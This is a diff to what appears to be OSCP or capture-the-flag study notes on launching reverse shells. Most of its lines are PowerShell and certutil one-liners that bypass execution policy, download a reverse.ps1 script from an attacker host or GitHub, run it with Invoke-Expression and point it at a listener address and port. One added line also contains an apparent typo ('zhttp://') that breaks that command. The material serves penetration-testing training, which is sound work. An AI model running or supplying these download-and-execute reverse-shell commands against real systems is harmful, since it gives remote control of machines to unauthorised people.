@@ -586,7 +586,7 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 >
 > ```cmd
 > powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
-> powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest -Uri http://$KALI/reverse.ps1')
+> powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest -Uri 'zhttp://$KALI/reverse.ps1')
 > ```
 
 #### Linux: Execute reverse shell TCP payload
@@ -598,13 +598,13 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 
 ### 4.5 Using the [reverse.ps1](/reverse.ps1) script in this repo
 
-Download to kali:
+#### Download to kali
 
 ```sh
 curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/reverse.ps1
 ```
 
-Download on target directly:
+#### Download on target directly
 
 ```cmd
 certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1
@@ -618,10 +618,26 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Ur
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1','.\reverse.ps1')
 ```
 
-Run the script:
+#### Run the script
+
+```pwsh
+$env:address='<listener address>'
+$env:port=<listener port>
+.\reverse.ps1
+```
+
+#### Run the script with `Invoke-Expression`
 
 ```cmd
-.\reverse.ps1 $KALI $PORT
+set address=192.168.84.3
+set port=4444
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
+```
+
+```pwsh
+$env:address='192.168.84.3'
+$env:port=4444
+Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
 ```
 
 ### 4.6. Windows direct connection
